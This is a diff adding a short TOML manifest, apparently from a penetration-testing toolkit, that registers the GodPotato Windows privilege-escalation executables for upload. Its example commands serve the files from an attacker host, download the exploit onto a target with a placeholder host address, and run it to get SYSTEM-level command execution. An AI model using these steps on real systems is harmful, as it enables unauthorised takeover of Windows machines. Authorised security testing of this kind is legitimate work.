@@ -1,0 +1,22 @@
+schema = 1
+kind = "upload"
+description = "From a Windows service account with SeImpersonatePrivilege to SYSTEM"
+tags = ["windows", "privesc", "potato", "impersonate"]
+upstream = "https://github.com/BeichenDream/GodPotato"
+licence = "Apache-2.0"
+arch = "x86_64"
+examples = [
+  "python3 -m http.server 80",
+  "iwr http://{lhost}/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe",
+  "GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
+]
+
+[[upload]]
+path = "files/GodPotato-NET4.exe"
+as = "GodPotato-NET4.exe"
+note = "Windows with .NET 4"
+
+[[upload]]
+path = "files/GodPotato-NET35.exe"
+as = "GodPotato-NET35.exe"
+note = "Windows with .NET 2 or 3.5"
